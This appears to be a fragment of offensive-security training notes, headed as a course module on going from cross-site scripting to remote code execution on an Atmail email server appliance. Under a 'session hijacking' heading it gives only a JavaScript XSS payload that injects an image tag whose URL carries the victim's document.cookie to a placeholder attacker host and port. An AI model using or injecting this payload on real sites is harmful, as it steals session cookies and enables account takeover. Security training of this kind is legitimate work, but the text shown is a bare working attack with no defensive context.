# WEB-300: Atmail eMail Server Appliance: from XSS to RCE


## session hijacking
```javascript
function addImage(){
  var img = document.createElement('img');
  img.src = "http://attacker-ip:port/"+document.cookie;
  document.body.appendChild(img);
}

addImage();
```
